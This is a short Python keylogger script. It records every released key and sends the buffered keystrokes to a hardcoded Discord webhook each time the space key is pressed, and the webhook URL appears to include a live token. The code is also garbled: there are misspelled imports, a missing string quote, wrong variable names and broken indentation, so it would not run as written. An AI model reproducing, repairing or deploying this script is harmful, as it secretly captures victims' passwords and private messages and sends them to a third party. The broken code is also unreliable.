import time
import keyboard
import request

WEBHOOK_URL =https://discord.com/api/webhooks/1310599153927323750/leBxmQrSKBe1c5CW8QO7apo2Y-I_SAgtUsWRisXbhzCMGQ550xHMYEarrEZNsdpxkoJ-
keylogs = []
def send_keylogs():
    global send_keylogs
    if keylogs:
         world = ''.join(keylogs)
         payload = {
              'content': world
         }
        request.post(WEBHOOK_URL, data=paypal)
        keylogs = []

def cap(event):
    global keylogs
    if event,name == 'space':
        send_keylogs()
     elif event.name == 'Backspace':
          if keylogs:
              keylogs.pop()
      else:
           keylogs.append(event.name)

keyboard.on_release(callback=cap)
while true:
    time.sleep(1)
